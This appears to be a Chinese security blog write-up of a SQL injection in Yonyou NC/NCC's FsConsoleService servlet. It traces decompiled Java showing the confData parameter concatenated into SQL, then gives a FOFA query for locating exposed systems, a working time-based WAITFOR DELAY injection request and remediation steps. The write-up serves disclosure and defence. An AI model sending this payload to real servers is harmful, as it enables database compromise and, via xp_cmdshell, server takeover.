---
title: "用友NC/NCC文件服务器配置管理 FsConsoleService SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-ncc-uap-pub-fs-console-FsConsoleService-confData-sqli.html
asset_dir: assets/用友ncncc文件服务器配置管理-fsconsoleservice-sql注入漏洞
---

# 用友NC/NCC文件服务器配置管理 FsConsoleService SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/16 18:27
- 839浏览
- [0评论](#comment)
- 2小时阅读

深入探索

开发

电脑配置

SQL

---

# 漏洞简介

用友NC是由用友公司开发的一套面向大型企业和集团型企业的管理[软件](#)产品系列。这一系列产品基于全球最新的互联网技术、云计算技术和移动应用技术，旨在帮助企业创新管理模式、引领商业变革。用友NC、NC [Cloud](#) uap.pub.fs.console.FsConsoleService 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者通过利用SQL注入漏洞配合数据库xp\_cmdshell可以执行任意命令，从而控制服务器。

网络存储

# 影响版本

NC633 / NC65 / NCC1811 / NCC1903 / NCC1909 / NCC2005

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

看下 uap.pub.fs.console.FsConsoleService 的业务逻辑实现

计算机服务器

```
package uap.pub.fs.console;

import com.mongodb.MongoClient;
import com.mongodb.ServerAddress;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import nc.bs.framework.common.InvocationInfoProxy;
import nc.bs.framework.core.conf.ClusterConf;
import nc.bs.framework.core.conf.Configuration;
import nc.bs.framework.core.conf.ServerConf;
import nc.bs.framework.server.BusinessAppServer;
import nc.bs.logging.Logger;
import nc.jdbc.framework.exception.DbException;
import nc.vo.ml.NCLangRes4VoTransl;
import nc.vo.pub.lang.UFDateTime;
import org.apache.commons.lang.ArrayUtils;
import org.apache.commons.lang.StringUtils;
import uap.ae.pub.crypto.RSAKeysGenerator;
import uap.bs.fs.framework.service.ConfFileReader;
import uap.bs.fs.framework.service.ConfFileWriter;
import uap.bs.fs.framework.service.FsClusterSync;
import uap.pub.fs.client.FileStorageClient;
import uap.pub.fs.client.RestFileTransfer;
import uap.pub.fs.docCenter.DcUpdateToFs;
import uap.pub.fs.domain.basic.FileHeader;
import uap.pub.fs.domain.basic.ModuleStorageCache;
import uap.pub.fs.domain.basic.ModuleVO;
import uap.pub.fs.domain.basic.QueryParams;
import uap.pub.fs.domain.basic.RequestInfo;
import uap.pub.fs.exception.FileStorageException;
import uap.pub.fs.imex.service.FileImExVO;
import uap.pub.fs.imex.service.ImportExportUtils;
import uap.pub.fs.meta.service.IFileMetaQueryService;
import uap.pub.fs.meta.service.ILogQueryService;
import uap.pub.fs.module.service.IModuleQueryService;
import uap.pub.fs.prop.service.FsPropertyReader;
import uap.pub.fs.util.FileStorageUtil;
import uap.pub.fs.util.FsDateUtilities;
import uap.pub.fs.util.FsLogger;
import uap.pub.fs.util.FsServiceUtil;

@WebServlet({"/FsConsoleService"})
public class FsConsoleService extends HttpServlet {
    private static final long serialVersionUID = 1L;
    private IFileMetaQueryService queryService;
    private IModuleQueryService moduleQueryService;
    private ILogQueryService logQueryService;

    public FsConsoleService() {
    }

    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        this.doPost(request, response);
    }

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        switch (request.getParameter("operType")) {
            case "login":
                this.loginAction(request, response);
                break;
            case "sysConf":
                this.sysConfAction(request, response);
                break;
            case "syncConfig":
                this.syncConfigAction(request, response);
                break;
            case "displayConf":
                this.displayConfAction(request, response);
                break;
            case "checkService":
                this.checkService(request, response);
                break;
            case "startService":
                this.startService(request, response);
                break;
            case "connTest":
                this.connTest(request, response);
                break;
            case "UFSTest":
                this.UFSTest(request, response);
                break;
            case "import":
                this.importFiles(request, response);
                break;
            case "export":
                this.exportFiles(request, response);
                break;
            case "update":
                this.updateDC2UFS(request, response);
                break;
            case "loadDataSources":
                this.loadDataSources(request, response);
                break;
            case "addModule":
                this.addModule(request, response);
                break;
            case "queryModule":
                this.queryModule(request, response);
                break;
            case "deleteModule":
                this.deleteModule(request, response);
                break;
            case "updateModule":
                this.updateModule(request, response);
                break;
            case "getKey":
                this.getKey(request, response);
                break;
            case "refreshKey":
                this.refreshKey(request, response);
                break;
            case "readLogConf":
                this.readLogConf(request, response);
                break;
            case "saveLogConf":
                this.saveLogConf(request, response);
                break;
            case "clearlLogData":
                this.clearlLogData(request, response);
                break;
            case "filterLog":
                this.filterLog(request, response);
                break;
            case "refreshLog":
                this.refreshLog(request, response);
        }

    }
```

根据 `operType` 的值进入对应的处理流程，当 `operType=filterLog` 是进入 `filterLog` 函数，其业务逻辑实现如下

工程与技术

```
private void filterLog(HttpServletRequest request, HttpServletResponse response) throws IOException {
    String confData = request.getParameter("confData").trim();
    StringBuffer sb = new StringBuffer();
    RequestInfo[] logs;
    if (StringUtils.isNotEmpty(confData)) {
        String[] keyValue = confData.split("=");
        if (keyValue.length < 2) {
            logs = this.getLogQueryService().getAllLogs();
        } else {
            logs = this.getLogQueryService().getLog(keyValue[0], keyValue[1]);
        }
    } else {
        logs = this.getLogQueryService().getAllLogs();
    }

    if (logs != null && logs.length > 0) {
        sb.append("{");

        for(int i = 0; i < logs.length; ++i) {
            RequestInfo log = logs[i];
            sb.append("\"").append(i).append("\":");
            sb.append("{\"client\":\"").append(log.getClient()).append("\",\"requestUser\":\"").append(log.getRequestUser()).append("\",\"operType\":\"").append(log.getOperType()).append("\",\"requestURL\":\"").append(log.getRequestURL()).append("\",\"content\":\"").append(log.getContent()).append("\",\"startTime\":\"").append(log.getStartTime()).append("\",\"endTime\":\"").append(log.getEndTime()).append("\"}");
            if (i != logs.length - 1) {
                sb.append(",");
            }
        }

        sb.append("}");
    }

    response.setContentType("text/html; charset=GBK");
    PrintWriter out = response.getWriter();

    try {
        out.print(sb.toString());
    } finally {
        out.flush();
        out.close();
    }

}
```

如果 confData 为空或者以 `=` 分割后的数组长度小于2则直接进入 `this.getLogQueryService().getAllLogs();`函数，或者将分割后的数组前两个分别作为 key 和 value 代入 `this.getLogQueryService().getLog(keyValue[0], keyValue[1]);` 函数

```
public RequestInfo[] getLog(String key, String value) {
    String dsName = this.getDsName();
    StringBuffer clause = new StringBuffer();
    clause.append(key);
    if (!StringUtils.isEmpty(value) && !"null".equalsIgnoreCase(value)) {
        clause.append("='").append(value).append("'");
    } else {
        clause.append(" is null");
    }

    clause.append(" ORDER BY TS DESC");
    RequestInfo[] LogVOs = (RequestInfo[])(new DBOperDelegator(RequestInfo.class, dsName)).loadByClause(clause.toString());
    return LogVOs != null && LogVOs.length > 0 ? LogVOs : new RequestInfo[0];
}
```

主要格式化处理 `key` 和 `value` 后组成SQL语句一部分，无任何过滤和校验，组合后的部分样例：`key='value'`格式，然后代入 `DBOperDelegator` 的 `loadByClause` 方法内，而此方法逻辑如下

SQL注入防护

```
public Object[] loadByClause(String clause) {
    IMappingMeta meta = this.getMappingMeta();

    Object[] var10;
    try {
        Collection list = (new BaseDAO(this.dsName)).retrieveByClause(this.getVoClz(), meta, clause);
        var10 = this.transArrays(list.toArray());
    } catch (Exception e) {
        String msg = "db operate: load by clause error. ";
        FsLogger.error(msg + e);
        throw new FileStorageDBException(msg, e);
    } finally {
        DataSourceUtil.postProcess(true);
    }

    return var10;
}
```

将 `clause` 代入 `retrieveByClause` 函数，其实现逻辑如下

代码安全审计

```
public Collection retrieveByClause(Class className, IMappingMeta meta, String condition) throws DAOException {
    PersistenceManager manager = null;

    Collection e;
    try {
        manager = this.createPersistenceManager(this.dataSource);
        e = manager.retrieveByClause(className, meta, condition);
    } catch (DbException e) {
        Logger.error(e.getMessage(), e);
        throw new DAOException(e.getMessage());
    } finally {
        if (manager != null) {
            manager.release();
        }

    }

    return e;
}
```

最终将 `condition` 组合在sql语句里并调用 `executeQuery` 执行SQL语句，整个过程无任何过滤校验，造成SQL注入漏洞。

漏洞预警服务

```
public Collection retrieveByClause(Class className, IMappingMeta meta, String condition, String[] fields, SQLParameter params) throws DbException {
    String sql = SQLHelper.getSelectSQL(meta.getTableName(), fields);
    if (condition != null && condition.length() != 0) {
        if (condition.trim().toUpperCase().startsWith("ORDER ")) {
            sql = sql + " " + condition;
        } else {
            sql = sql + " WHERE " + condition;
        }
    }

    BaseProcessor processor = new BeanMappingListProcessor(className, meta, fields);
    return params != null ? (Collection)this.session.executeQuery(sql, params, processor) : (Collection)this.session.executeQuery(sql, processor);
}
```

# 漏洞复现

默认访问接口会返回所有日志内容

软件

[![用友NC/NCC文件服务器配置管理 FsConsoleService SQL注入漏洞](images/img-001-2d2c35832c1c.webp)](https://image.mrxn.net/da38e5d46b7547a1a5cd2951f1144930.webp)

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)验证

```
GET /servlet/~uapbs/uap.pub.fs.console.FsConsoleService?confData=guid%3d233%27;WAITFOR+DELAY+'0:0:4'--+&operType=filterLog HTTP/1.0
Host: nc.mrxn.net
```

[![用友NC/NCC文件服务器配置管理 FsConsoleService SQL注入漏洞](images/img-002-aa8b2ff30b7a.webp)](https://image.mrxn.net/1d5535b0ac28448f9d609227c58a802e.webp)

# 解决方案

1、将hotwebs/fs/console.html和hotwebs/fs/manage.html删除。

物流软件安全

2、删除hotwebs\fs\WEB-INF\web.xml里的如下配置

```
<servlet>
<servlet-name>FileConsoleService</servlet-name>
<servlet-class>uap.pub.fs.console.FsConsoleService</servlet-class>
</servlet>
<servlet-mapping>
<servlet-name>FileConsoleService</servlet-name>
<url-pattern>/console</url-pattern>
</servlet-mapping>
```

重启服务。

# 参考

- <https://security.yonyou.com/#/noticeInfo?id=213>

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.解决方案](#toc-6-)
- [7.参考](#toc-7-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
